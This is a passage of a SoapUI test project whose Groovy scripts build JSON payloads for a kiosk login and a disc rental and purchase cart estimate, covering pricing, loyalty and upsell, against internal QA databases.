def MobilePhoneNumber = context.expand( '${#TestCase#MobilePhoneNumber}' );
def KioskID = context.expand( '${#TestCase#KioskID}' );
def MessageId = UUID.randomUUID().toString();
calendar = Calendar.getInstance();
def theDate = (621355968000000000 +calendar.getTimeInMillis()*10000).toString();
def dateString = (new Date().format("yyyy-MM-dd'T'HH:mm:ss.SSSSSSS"));

//Build Reconcile Request
requestPayload += "{";
requestPayload += "\"MessageId\": \"$MessageId\",";
requestPayload += "\"KioskId\": $KioskID,";
requestPayload += "\"EngineVersion\": \"1.15.0.6\",";
requestPayload += "\"BundleVersion\": \"2.2.2.82\",";
requestPayload += "\"PhoneNumber\": \"$MobilePhoneNumber\",";
requestPayload += "\"Pin\": \"$EncryptedPin\",";
requestPayload += "\"IsOffline\": false,";
requestPayload += "\"LanguageCode\": \"es\",";
requestPayload += "\"MessageType\": \"KioskLogin\"";
requestPayload += "}";


// log to soapui log
log.info("KioskOnlinePayload: $requestPayload");

// url encode json string
result = "payload=" + URLEncoder.encode(requestPayload)
testRunner.testCase.setPropertyValue("RequestBody",result)
testRunner.testCase.setPropertyValue("KioskLoginGUID",MessageId.toString()); //For MessageControl Validations
</script></con:config></con:testStep><con:testStep type="httprequest" name="KioskLogin (Request)" id="c3b65786-3098-462b-8c93-0bb6f03bbb89"><con:settings/><con:config method="POST" xsi:type="con:HttpRequest" id="2f827cec-96de-4b99-b2fc-4153a6dfe7c0" name="KioskLogin (Request)" postQueryString="false" mediaType="application/x-www-form-urlencoded" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting></con:settings><con:endpoint>${#Project#KSEndpoint}</con:endpoint><con:request>${#TestCase#RequestBody}</con:request><con:assertion type="GroovyScriptAssertion" id="d00fe26d-b144-4dd6-8364-96f44b303ec1" name="Script Assertion"><con:configuration><scriptText>def response = URLDecoder.decode(messageExchange.getResponseContent())
log.info ("KioskLoginResponse: $response")</scriptText></con:configuration></con:assertion><con:credentials><con:selectedAuthProfile>No Authorization</con:selectedAuthProfile><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:parameters/><con:environmentSpec><con:entry environmentId="088f2c6b-5bf5-4b7a-aea1-4ebec9f3aa3a"><con:authProfile>No Authorization</con:authProfile></con:entry><con:entry environmentId="bff3f14b-e680-473b-bba1-89a50bc86a72"><con:authProfile>No Authorization</con:authProfile></con:entry></con:environmentSpec></con:config></con:testStep><con:properties><con:property><con:name>Pin</con:name><con:value>1234</con:value></con:property><con:property><con:name>MobilePhoneNumber</con:name><con:value>9876543211</con:value></con:property><con:property><con:name>KioskID</con:name><con:value>1505</con:value></con:property><con:property><con:name>EncryptedPin</con:name><con:value>N3re1i16pTE=</con:value></con:property><con:property><con:name>RequestBody</con:name><con:value>payload=%7B%22MessageId%22%3A+%222c6fc3dc-e043-44ee-8858-18b85632f41d%22%2C%22KioskId%22%3A+1505%2C%22EngineVersion%22%3A+%221.15.0.6%22%2C%22BundleVersion%22%3A+%222.2.2.82%22%2C%22PhoneNumber%22%3A+%229876543211%22%2C%22Pin%22%3A+%22N3re1i16pTE%3D%22%2C%22IsOffline%22%3A+false%2C%22LanguageCode%22%3A+%22es%22%2C%22MessageType%22%3A+%22KioskLogin%22%7D</con:value></con:property><con:property><con:name>KioskLoginGUID</con:name><con:value>2c6fc3dc-e043-44ee-8858-18b85632f41d</con:value></con:property></con:properties><con:reportParameters/></con:testCase><con:testCase failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="EstimateAccrual" searchProperties="true" timeout="0" wsrmEnabled="false" wsrmVersion="1.0" wsrmAckTo="" amfAuthorisation="false" amfEndpoint="" amfLogin="" amfPassword="" id="b174a63b-3ea0-4781-b459-c8790928cdc5"><con:description/><con:settings/><con:testStep type="jdbc" name="Warmup Script" id="fedf8c2d-0dcb-4fea-8d55-ace2b8fc72b4"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>Select GetDate() As CurrentDate</con:query><con:assertion type="JDBC Status" id="5897a997-f0a8-4714-b2ed-24087b99e9b6" name="JDBC Status"/><con:properties/></con:config></con:testStep><con:testStep type="groovy" name="Encode Message Body (EstimateAccrual)" id="e54aeb90-c275-44ed-bd9b-4cec19983c18"><con:settings/><con:config><script><![CDATA[//NOTES: Disabled extra logging; no need to delete them. 
import java.util.Date
import java.util.Calendar
import java.text.DecimalFormat;
import com.eviware.soapui.model.testsuite.TestRunner.Status;
Round16 = new DecimalFormat("#.################"); //Rounding the amount to 16 decimals.
Round2 = new DecimalFormat("#.####"); //Rounding the amount to 2 decimals.
//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def epcConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('EPCSvc');
def constring = ConObj.getConnectionString();
def epcconstring = epcConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);
def epcsql = Sql.newInstance(epcconstring);

//Get CreditCard Info
def encryptCC = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Generate Encrypted CCInfo"];
def KeyID = encryptCC.getPropertyValue("KeyID");
def CardID = encryptCC.getPropertyValue("CardID");
def EncryptedNumber = encryptCC.getPropertyValue("EncryptedNumber");
def EncryptedTrack2 = encryptCC.getPropertyValue("EncryptedTrack2");
def lastFour = encryptCC.getPropertyValue("CardNumber").reverse().take(4).reverse();
def CardType = encryptCC.getPropertyValue("CardType");
//log.info ("KeyID:$KeyID; CardID:$CardID; EncryptedNumber:$EncryptedNumber; EncryptedTrack2:$EncryptedTrack2");
ccPayload = ""
ccPayload += "\"CreditCard\": {";
ccPayload += "\"FirstName\": \"Redbox\",";
ccPayload += "\"LastName\": \"Server\",";
ccPayload += "\"Number\": \"$EncryptedNumber\",";
ccPayload += "\"PostalCode\": \"60181\",";
ccPayload += "\"ExpirationMonth\": \"12\",";
ccPayload += "\"ExpirationYear\": \"20\",";
ccPayload += "\"KeyId\": $KeyID,";
ccPayload += "\"CardId\": \"$CardID\",";
ccPayload += "\"LastFour\": \"$lastFour\",";
ccPayload += "\"CardType\": $CardType,";
ccPayload += "\"Track2\": \"$EncryptedTrack2\"";
ccPayload += "},";
testRunner.testCase.setPropertyValue("CCPayload", ccPayload);

//Get hard coded disc prices and non-return days
def dvdPrice = context.expand( '${#TestSuite#DVDPrice}' );
def blurayPrice = context.expand( '${#TestSuite#BlurayPrice}' );
def uhdPrice = context.expand( '${#TestSuite#4KPrice}' );
def gamePrice = context.expand( '${#TestSuite#GamePrice}' );
def dvdNonReturnDays = context.expand( '${#TestSuite#DVDNonReturnDays}' );
def blurayNonReturnDays = context.expand( '${#TestSuite#BlurayNonReturnDays}' );
def uhdNonReturnDays = context.expand( '${#TestSuite#4KNonReturnDays}' );
def gameNonReturnDays = context.expand( '${#TestSuite#GameNonReturnDays}' );
def purchasePrice = context.expand( '${#TestSuite#PurchasePrice}' );
def digitalCodePrice = context.expand( '${#TestSuite#DigitalCodePrice}' );
def KioskId= context.expand( '${#TestCase#KioskId}' );

//Service Fee
def enableServiceFee = context.expand( '${#TestCase#EnableServiceFee}');
def serviceFeeTaxRate = context.expand( '${#TestCase#ServiceFeeTaxRate}');
def serviceFeeAmount = context.expand( '${#TestCase#ServiceFeeAmount}');

//Calculate Nonreturn price
def dvdNonreturnPrice = (dvdPrice.toBigDecimal() * dvdNonReturnDays.toBigDecimal());
def blurayNonreturnPrice = (blurayPrice.toBigDecimal() * blurayNonReturnDays.toBigDecimal());
def uhdNonreturnPrice = (uhdPrice.toBigDecimal() * uhdNonReturnDays.toBigDecimal());
def gameNonreturnPrice = (gamePrice.toBigDecimal() * gameNonReturnDays.toBigDecimal());
//log.info ("dvdNonreturnPrice: $dvdNonreturnPrice; blurayNonreturnPrice: $blurayNonreturnPrice; gameNonreturnPrice: $gameNonreturnPrice");

//Get Disc Info
def getDisctc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["GetDiscs"];

//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j<getDisctc.getPropertyCount();j++)
{
   getDisctc.getPropertyAt(j).setValue("");
}
//BUILD THE RENTAL and PURCHASE PAYLOAD:
//Grab the barcodes, and product types; build the lists. 
//Rental
allBarcodes = [];
rentalBarcodes = [];
rentalTitleIds = [];
rentalProductFamily = [];
rentalProductType = [];
rentalDiscPrice = [];
rentalNonReturnPrice = [];
rentalNonReturnDays = [];
loyaltyProductId = [];
loyaltyProductPrice = [];
loyaltyPoints = [];
promoProductId = [];
promoProductPrice = [];
nonLoyaltyProductId = [];
nonLoyaltyProductPrice = [];
redemptionPoints = [];
discountedProductId = []; //For Assertions.
discountedProductPrice = []; //For Assertions.
blurayUpsellTypeId = [];
productGroupId = [];
discountAmountList = [];//PROMO List of Amounts for Loyalty and Promo Values 
//MNP
mnpTitleId = [];

//TSP
tspTitleId = [];

//Purchase
purchaseBarcodes = [];
purchaseProductFamily = [];
purchaseProductType = [];
purchaseDiscPrice = [];
purchaseTitleIds = [];
itemSourceType = [];

//Payload building and Amount Calculations
//Rental Items Payload
rentalPayload = "{\"GroupType\" : 1,  \"Items\" : [";
BigDecimal rentalTotal = 0;
int rentalCount = 0;
//Purchase Items Payload
purchasePayload = "{\"GroupType\" : 2,  \"Items\" : [";
BigDecimal purchaseTotal = 0;
BigDecimal digitalTotal = 0;
BigDecimal appliedPromoValue = 0;
int purchaseCount = 0;

//MNP
BigDecimal mnpAmount = 0;

//TSP
BigDecimal tspPromoAmount = 0;

BigDecimal SubTotal = 0;
BigDecimal DiscountedSubTotal = 0;
BigDecimal EstimatedLoyaltyAmount = 0;
BigDecimal TotalCartAmount = 0;//Total of Rental and Purchase Amount
BigDecimal remainingPromoValue = 0;

serviceFeePayload = ""; //ServiceFee Payload
promoPayload = ""; //Promo Code payload
loyaltyPayload = ""; //Loyalty points payload
requestPayload = ""; //Total payload rental + purchase + promo + loyalty

//Creating a Boolean
HasPhysicalPurchase = 'false';
testRunner.testCase.setPropertyValue("HasPhysicalPurchase",HasPhysicalPurchase);

//Get to-do Rental info
def numAddRentals = Eval.me("[" + context.expand( '${#TestCase#numOfRentals}' ) + "]");
def numAddPurchases = Eval.me("[" + context.expand( '${#TestCase#numOfPurchases}' ) + "]");
def PromoCode = context.expand( '${#TestCase#PromoCode}');
BigDecimal discountvalue = (context.expand( '${#TestCase#PromoValue}' ).toBigDecimal()); //PromoCode Value
def rentalFormatIds = context.expand( '${#TestCase#rentalFormats}' );
def purchaseFormatIds = context.expand( '${#TestCase#PurchaseFormats}' );
def loyaltyFlag = context.expand( '${#TestCase#LoyaltyFlag}' );
def CustomerProfileNumber = context.expand( '${#TestCase#CustomerProfileNumber}' );

//MNP
def mnpFlag = context.expand( '${#TestCase#MNPFlag}' );

//TSP
def hasTSP = context.expand( '${#TestCase#HasTSP}' );
def tspFlag = context.expand( '${#TestCase#TSPFlag}' ); 
//Recommended Titles
def RCFlag = Eval.me("[" + context.expand( '${#TestCase#RCFlag}' ) + "]");
def hasOffer = context.expand( '${#TestCase#HasOffer}' )



//Rental & Purchase Format list
rentalformatIDList = rentalFormatIds.split(",");
purchaseformatIDList = purchaseFormatIds.split(",");

//Loyalty
loyaltyFlagList = loyaltyFlag.split(",");

//MNP
mnpFlagList = mnpFlag.split(",");
//Loyalty
int numberOfLoyaltyFlags = Eval.me("[" + loyaltyFlag + "]").count {it == 1};
//TSP
int numberOfTSPFlags = Eval.me("[" + tspFlag + "]").count {it == 1}; 
//Recommended Titles
int numberOfRCFlags = Eval.me("[" + RCFlag + "]").count {it == 1}; 


//TO-DO STILL THERE IS A FLAW IN THIS LOGIC. NEED TO FIGURE OUT THE SOLUTION.
//Purpose: If datasource says rent Dvd, Bluray and provide quantity for only Dvd and not for Bluray; currently it fail with array out of bound error.
//For Rentals
if (rentalformatIDList.size() != numAddRentals.size())
{
    def difference = (rentalformatIDList.size() - numAddRentals.size())
     for (di = 0; di < difference; di++)
     {
         numAddRentals.add('1') //if the size is different add the default to 1; tried to make it 0; but json was building wrong with extra ,(comma). TO-DO: Fix that issue.
     }
}
else if (mnpFlagList.size() != numAddRentals.size())
{
     //nothing to do, code looks good
}
/*WRONG PLACE
//MNP
if (mnpFlagList.size() != numAddRentals.size())
{
     def difference = (Integer.valueOf(numAddRentals) - mnpFlagList.size())
     log.info ("difference: $difference")
     for (di = 0; di < difference; di++)
     {
         mnpFlagList.add('1') //if the size is different add the default to 1; tried to make it 0; but json was building wrong with extra ,(comma). TO-DO: Fix that issue.
     }
     
}
*/
//For Purchases
if (purchaseformatIDList.size() != numAddPurchases.size())
{
    def difference = (purchaseformatIDList.size() - numAddPurchases.size())
     for (di = 0; di < difference; di++)
     {
         numAddPurchases.add('1') //if the size is different add the default to 1
     }
}
else
{
     //nothing to do, code looks good
}
int totalCartCount = 0;
//Get CartSize
if (rentalFormatIds != '' && purchaseFormatIds != '')
{
	log.info ("Has both rental and purchases");
	totalCartCount += (numAddRentals.sum()) + (numAddPurchases.sum())
}
else if (rentalFormatIds == '' && purchaseFormatIds != '')
{
	log.info ("Has purchases");
	totalCartCount +=  (numAddPurchases.sum())
}
else if (rentalFormatIds != '' && purchaseFormatIds == '')
{
	log.info ("Has rental");
	totalCartCount +=  (numAddRentals.sum())
}
else
{
	log.info("I shouldnt be here");
}

//Set OfferCode Data
if (hasOffer == 'false')
{
	//Set the RCFlag to 0 so that OfferCode is set to NULL.
	for (rc = 0; rc < totalCartCount; rc++)
     {
         //if the size is different add the default to 1
         RCFlag.add('0');
     }
}
else
{
	//Just to make sure that we have RCFlag for all the discs
	if (RCFlag.size() != totalCartCount)
	{
	    def difference = (totalCartCount - RCFlag.size())
	     for (di = 0; di < difference; di++)
	     {
	         RCFlag.add('0') //if the size is different add the default to 0
	     }
	}
	else
	{
	     //nothing to do, code looks good
	}
}

//Setting the RCFlags
//Saving the flag for Reconcile.
testRunner.testCase.setPropertyValue("RCFlag",RCFlag.toString().replaceAll("\\[","").replaceAll("\\]",""));

if (rentalFormatIds != '')
{
	rentalCartCount = numAddRentals.sum()
	rentalRCFlag = RCFlag.take(rentalCartCount)
	remainingRCFlag = RCFlag.drop(rentalCartCount)

	testRunner.testCase.setPropertyValue("rentalRCFlag",rentalRCFlag.toString().replaceAll("\\[","").replaceAll("\\]",""));
	testRunner.testCase.setPropertyValue("purchaseRCFlag",remainingRCFlag.toString().replaceAll("\\[","").replaceAll("\\]",""));
}
else
{
	rentalCartCount = numAddPurchases.sum()
	remainingRCFlag = RCFlag.take(rentalCartCount)
	rentalRCFlag = RCFlag.drop(rentalCartCount)
	
	testRunner.testCase.setPropertyValue("rentalRCFlag",rentalRCFlag.toString().replaceAll("\\[","").replaceAll("\\]",""));
	testRunner.testCase.setPropertyValue("purchaseRCFlag",remainingRCFlag.toString().replaceAll("\\[","").replaceAll("\\]",""));
}

//Prepare the final list
numAddRentalsList = numAddRentals.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
numAddPurchasesList = numAddPurchases.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");

log.info ("numAddRentalsList: $numAddRentalsList; rentalformatIDList: $rentalformatIDList");
log.info ("numAddPurchasesList: $numAddPurchasesList; purchaseformatIDList: $purchaseformatIDList");
if ((rentalFormatIds == '0') || (rentalFormatIds == '') || (rentalFormatIds == 'null'))
{
	log.info ("No Rentals in the transaction");
	getDisctc.setPropertyValue('ExcludeRentalTitles', '0');
	getDisctc.setPropertyValue('ExcludePurchaseTitles', '0');
	testRunner.testCase.setPropertyValue('RentalCount', rentalCount.toString());
	testRunner.testCase.setPropertyValue("RentalTaxAmount", '0');
	testRunner.testCase.setPropertyValue("HasPromoDiscount","0");
	testRunner.testCase.setPropertyValue("HasLoyaltyDiscount","0");
}
else
{
	//Will Run the GetDiscs TestCase; and categorize all the formats required for the transaction and save it at GetDisc testCase property level.
	for (r = 0; r < rentalformatIDList.size(); r++)
	{
	    curformatID = rentalformatIDList[r].toString().trim();
	    //log.info ("curformatID: $curformatID");
	    def getFormatName = sql.firstRow("select FormatName AS OID from Format where FormatID = $curformatID");
	    def FormatName = (getFormatName.OID);     
	    getDisctc.setPropertyValue('FormatID', curformatID);
	    getDisctc.setPropertyValue('FormatName', FormatName);  
	    getDisctc.setPropertyValue('KioskID',KioskId);  
	    //Manually Hardcoded to some value so that SQL query doesnot fail in GetDiscs test Case.  
	    getDisctc.setPropertyValue('ExcludeRentalTitles', '0');    
	    getDisctc.setPropertyValue('ExcludePurchaseTitles', '0');  
	    
	    //Run the test case: GetRecoDiscs
	    def runGetDiscs = getDisctc.run( null, false );
	        
	    // show that it worked out ok
	    log.info("Status: $runGetDiscs.status, time taken for TestCase : [Get Discs] For $FormatName was: $runGetDiscs.timeTaken ms");
	        
	    // assert that it didn't fail
	    assert runGetDiscs.status != Status.FAILED : runGetDiscs.reason
	}
	
	//Upsell coding logic
	def upsellOffer = context.expand( '${#TestCase#UpsellOffer}' );
	def upsellOfferStatus = context.expand( '${#TestCase#UpsellOfferStatus}' );
	upsellOfferList = upsellOffer.split(",");
	upsellOfferStatusList = upsellOfferStatus.split(",");
	
	//Offer Code	
	offerCodeList = rentalRCFlag.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
	
	//Will Grab one format a time to build the request.	
	for (f = 0; f < rentalformatIDList.size(); f++)
	{
	    def HasUpsell = context.expand( '${#TestCase#HasUpsell}' );
	    if (HasUpsell == 'true')
	    {
	    	//Upsell Logic
		curUpsellOffer = upsellOfferList[f].toString().trim();
		curUpsellOfferStatus = upsellOfferStatusList[f].toString().trim();
	    }
	    else
	    {
	    	curUpsellOffer = '0' 
	    }
	    
	    curformatID = rentalformatIDList[f].toString().trim(); 	    
	    def getFormatName = sql.firstRow("select FormatName, FormatTypeID from Format where FormatID = $curformatID");
	    def FormatName = (getFormatName.FormatName);
	    def formatTypeID = (getFormatName.FormatTypeID.toString());
	    
	    //Get FormatTypeName from FormatIypeID
	    def excuteFormatType = sql.firstRow("Select FormatTypeName from FormatType Where FormatTypeID = $formatTypeID");
	    def formatTypeName = (excuteFormatType.FormatTypeName.toString());
	    def getBarcode = getDisctc.getPropertyValue("$FormatName-Barcodes");
	    def getTitleIDs = getDisctc.getPropertyValue("$FormatName-Titles");    
	    //log.info ("getBarcode-$FormatName: $getBarcode");
	    getBarcodeList = getBarcode.split(",");
	    getTitleList = getTitleIDs.split(",");
	    numOfBarcodes = numAddRentalsList[f].toString().trim();
	    log.info ("numOfBarcodes: $numOfBarcodes; FormatName: $FormatName");	

	    //Create a payload for rental items; barcodes are grabed from the GetDiscs testcase property. 
	    for (b = 0; b < numOfBarcodes.toInteger(); b++)
	    {
	        curBarcodeID = getBarcodeList[b].toString().trim();
	        curTitleID = getTitleList[b].toString().trim();
	        curOfferCode = offerCodeList[b].toString().trim();
       	   //curmnpFlag = mnpFlagList[b].toString().trim();
       	   //log.info ("+++++++++++++++++++++++++++++++++++++++++++++++");
       	   //log.info (curmnpFlag);
       	   //log.info ("+++++++++++++++++++++++++++++++++++++++++++++++");
	        rentalPayload += "{"
	        rentalPayload += "\"ProductId\" : $curTitleID,"
	        rentalPayload += "\"Barcode\" : \"$curBarcodeID\","
	        rentalPayload += "\"VendStatus\" : 28," //To-DO
	        rentalPayload += "\"ProductFamily\" : \"$formatTypeName\","
	        rentalPayload += "\"ProductType\" : \"$FormatName\","
	        rentalPayload += "\"MultiDisc\" : false,"
	        if (curOfferCode == '1')
	        {
	        	rentalPayload += "\"OfferCode\" : \"RC\","
	        }
	        else
	        {
	        	rentalPayload += "\"OfferCode\" : null,"
	        }
	        rentalPayload += "\"Pricing\" : {"
	        if (curformatID == '1') //For DVD
	        {
			rentalPayload += "\"InitialNight\" : $dvdPrice,"
			rentalPayload += "\"ExtraNight\" : $dvdPrice,"
			rentalPayload += "\"NonReturn\" : $dvdNonreturnPrice,"
			rentalPayload += "\"Expiration\" : $dvdPrice,"
			rentalPayload += "\"NonReturnDays\" : $dvdNonReturnDays,"
			rentalPayload += "\"PriceSetId\" : 0,"
	          rentalPayload += "\"Purchase\" : 0,"
			//Added a part of ProductPricing for BI; harcoded for the time being.
			rentalPayload += "\"ProductPriceId\" : 0,"
			rentalPayload += "\"InitialDays\" : 1,"
			rentalPayload += "\"DefaultInitialNight\" : $dvdPrice,"
			rentalPayload += "\"DefaultExtraNight\" : $dvdPrice"

			//For Upsell 
			upsellTypeId = 1;
		    //Calculate Rental Total
			rentalTotal += (dvdPrice.toBigDecimal());
			rentalDiscPrice.add(dvdPrice);
			rentalNonReturnPrice.add(dvdNonreturnPrice);
			rentalNonReturnDays.add(dvdNonReturnDays);
			redemptionPoints.add('1500');
	        }
	        else if (curformatID == '2') //For Bluray
	        {
			rentalPayload += "\"InitialNight\" : $blurayPrice,"
			rentalPayload += "\"ExtraNight\" : $blurayPrice,"
			rentalPayload += "\"NonReturn\" : $blurayNonreturnPrice,"
			rentalPayload += "\"Expiration\" : $blurayPrice,"
			rentalPayload += "\"NonReturnDays\" : $blurayNonReturnDays,"
			rentalPayload += "\"PriceSetId\" : 1,"
	          rentalPayload += "\"Purchase\" : 0,"
			//Added a part of ProductPricing for BI; harcoded for the time being.
			rentalPayload += "\"ProductPriceId\" : 0,"
			rentalPayload += "\"InitialDays\" : 1,"
			rentalPayload += "\"DefaultInitialNight\" : $blurayPrice,"
			rentalPayload += "\"DefaultExtraNight\" : $blurayPrice"
			
			//For Upsell 
			upsellTypeId = 1;
			//Calculate Rental Total
			rentalTotal += (blurayPrice.toBigDecimal());
			rentalDiscPrice.add(blurayPrice);
			rentalNonReturnPrice.add(blurayNonreturnPrice); 
			rentalNonReturnDays.add(blurayNonReturnDays);
			redemptionPoints.add('1750')
	        }
	        else if (curformatID == '19') //For 4K
	        {
			rentalPayload += "\"InitialNight\" : $uhdPrice,"
			rentalPayload += "\"ExtraNight\" : $uhdPrice,"
			rentalPayload += "\"NonReturn\" : $uhdNonreturnPrice,"
			rentalPayload += "\"Expiration\" : $uhdPrice,"
			rentalPayload += "\"NonReturnDays\" : $uhdNonReturnDays,"
			rentalPayload += "\"PriceSetId\" : 1,"
	          rentalPayload += "\"Purchase\" : 0,"
			//Added a part of ProductPricing for BI; harcoded for the time being.
			rentalPayload += "\"ProductPriceId\" : 0,"
			rentalPayload += "\"InitialDays\" : 1,"
			rentalPayload += "\"DefaultInitialNight\" : $uhdPrice,"
			rentalPayload += "\"DefaultExtraNight\" : $uhdPrice"
			
			//For Upsell 
			upsellTypeId = 3;
			//Calculate Rental Total
			rentalTotal += (uhdPrice.toBigDecimal());
			rentalDiscPrice.add(uhdPrice);
			rentalNonReturnPrice.add(uhdNonreturnPrice); 
			rentalNonReturnDays.add(uhdNonReturnDays);
			redemptionPoints.add('2000')
	        }
	        else //For Games
	        {
			rentalPayload += "\"InitialNight\" : $gamePrice,"
			rentalPayload += "\"ExtraNight\" : $gamePrice,"
			rentalPayload += "\"NonReturn\" : $gameNonreturnPrice,"
			rentalPayload += "\"Expiration\" : $gamePrice,"
			rentalPayload += "\"NonReturnDays\" : $gameNonReturnDays,"
			rentalPayload += "\"PriceSetId\" : 1,"
	          rentalPayload += "\"Purchase\" : 0,"
			//Added a part of ProductPricing for BI; harcoded for the time being.
			rentalPayload += "\"ProductPriceId\" : 0,"
			rentalPayload += "\"InitialDays\" : 1,"
			rentalPayload += "\"DefaultInitialNight\" : $gamePrice,"
			rentalPayload += "\"DefaultExtraNight\" : $gamePrice"
			
			//For Upsell 
			upsellTypeId = 1;
			//Calculate Rental Total
			rentalTotal += (gamePrice.toBigDecimal());
			rentalDiscPrice.add(gamePrice);
			rentalNonReturnPrice.add(gameNonreturnPrice);
			rentalNonReturnDays.add(gameNonReturnDays);
			redemptionPoints.add('2500');
	        }
	        //rentalPayload += ",\"SourceType\" : 1"  --NEEDED ONLY FOR RECO (RESVAUTH AND MODRESVPICKUP
			
			rentalPayload += "}," 
			if (curUpsellOffer == '1')
			{
				log.info ("curTitleID:$curTitleID")
				//def getProductGroupInfo = epcsql.firstRow("Select ProductGroupId from ProductGroupXREF Where ProductId = $curTitleID");
				def getProductGroupInfo = epcsql.firstRow("Select ProductGroupId from ProductGroupXREF Where ProductId in (Select ProductId from Product Where ProductNumber =$curTitleID)");
				def curproductGroupId = getProductGroupInfo.ProductGroupId.toString();
				rentalPayload += "\"BlurayUpsell\" : {"
				rentalPayload += "\"ProductGroupId\" : $curproductGroupId,"
				rentalPayload += "\"Offer\" : \"$curUpsellOfferStatus\","
				rentalPayload += "\"TitleId\" : $curTitleID,"
				rentalPayload += "\"TypeId\" : $upsellTypeId"
				rentalPayload += "},"

				productGroupId.add(curproductGroupId);
			}
			else
			{
				rentalPayload += "\"BlurayUpsell\" : null,"

				productGroupId.add(0)
			}
			rentalPayload += "\"ItemSourceType\" : 3"
			rentalPayload += "}" 
			 
			//Prepare it as List.
			rentalTitleIds.add(curTitleID);
			rentalBarcodes.add(curBarcodeID);
			allBarcodes.add(curBarcodeID);
			testRunner.testCase.setPropertyValue("BarcodeForTnx",curBarcodeID.toString()); 
			rentalProductFamily.add(formatTypeName);
			rentalProductType.add(FormatName);
			blurayUpsellTypeId.add(upsellTypeId);
			itemSourceType.add(0);
			rentalCount += 1;
			
			if (b+1 < numOfBarcodes.toInteger())
			{
			  rentalPayload += ","
			} 
	    }	    
	    if (f+1 < rentalformatIDList.size())
	    {
	        rentalPayload += ","
	    }  
	    //testRunner.testCase.setPropertyValue("rentalPayload",rentalPayload);
	    getDisctc.setPropertyValue('ExcludeRentalTitles', rentalTitleIds.join(",").toString());
    	    testRunner.testCase.setPropertyValue('RentalTitleIds', rentalTitleIds.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalBarcodes', rentalBarcodes.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalProductFamily', rentalProductFamily.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalProductType', rentalProductType.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalCount', rentalCount.toString());
	    testRunner.testCase.setPropertyValue('RentalDiscPrice', rentalDiscPrice.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalNonReturnPrice', rentalNonReturnPrice.join(",").toString());
	    testRunner.testCase.setPropertyValue('RentalNonReturnDays', rentalNonReturnDays.join(",").toString());
	    testRunner.testCase.setPropertyValue('RedemptionPoints', redemptionPoints.join(",").toString());
	    testRunner.testCase.setPropertyValue('UpsellTypeId', blurayUpsellTypeId.join(",").toString()); 
	    testRunner.testCase.setPropertyValue('ProductGroupId', productGroupId.join(",").toString()); 
	    testRunner.testCase.setPropertyValue('ItemSourceType', itemSourceType.join(",").toString())
	}
	log.info ("rentalTitleIds: $rentalTitleIds; rentalDiscPrice:$rentalDiscPrice; redemptionPoints:$redemptionPoints");
	testRunner.testCase.setPropertyValue("DiscountTitleIds",rentalTitleIds.join(",").toString())
	testRunner.testCase.setPropertyValue("DiscountProductPrices",rentalDiscPrice.join(",").toString())

//Build loyalty payload.
	if (loyaltyFlag == "")
	{
		testRunner.testCase.setPropertyValue("NonLoyaltyProductId",rentalTitleIds.join(",").toString());
		testRunner.testCase.setPropertyValue("NonLoyaltyProductPrice",rentalDiscPrice.join(",").toString());
		testRunner.testCase.setPropertyValue("HasLoyaltyDiscount","0");
	}
	else
	{
		loyaltyTitleList = rentalTitleIds.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
		loyaltyTitlePrice = rentalDiscPrice.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
		for (l = 0; l < numberOfLoyaltyFlags; l++)
		{
		    	def DiscountTitleIds = Eval.me("[" + context.expand( '${#TestCase#DiscountTitleIds}' ) + "]");
		    	def DiscountProductPrices = Eval.me("[" + context.expand( '${#TestCase#DiscountProductPrices}' ) + "]");
		    	def redemptionPointsList = Eval.me("[" + context.expand( '${#TestCase#RedemptionPoints}' ) + "]");
		    	curLoyaltyFlag = loyaltyFlagList[l].toString().trim();
		    	curLoyaltyTitle = DiscountTitleIds.take(1).toString().replace("[", "").replace("]", "");
			curLoyaltyPrice = DiscountProductPrices.take(1).toString().replace("[", "").replace("]", "");
			curredemptionPoints = redemptionPointsList.take(1).toString().replace("[", "").replace("]", "");
		    	//log.info ("curLoyaltyFlag:$curLoyaltyFlag; curLoyaltyTitle:$curLoyaltyTitle; curLoyaltyPrice:$curLoyaltyPrice; curredemptionPoints:$curredemptionPoints");
		    	if (curLoyaltyFlag == '1')
		    	{
		    	testRunner.testCase.setPropertyValue("HasLoyaltyDiscount","1");
		    	loyaltyPayload += "{"; 
			loyaltyPayload += "\"ProductId\": $curLoyaltyTitle,";
			loyaltyPayload += "\"DiscountType\": \"Loyalty\",";
			loyaltyPayload += "\"PromotionCode\": null,";
			//promoPayload += "\"PromotionIntentCode\": \"$ProductId\",";
			loyaltyPayload += "\"RedemptionPoints\": $curredemptionPoints,";
			loyaltyPayload += "\"Amount\": $curLoyaltyPrice";
			loyaltyPayload += "}"; 
			//Calculate Loyalty Total
			EstimatedLoyaltyAmount += (curLoyaltyPrice.toBigDecimal());
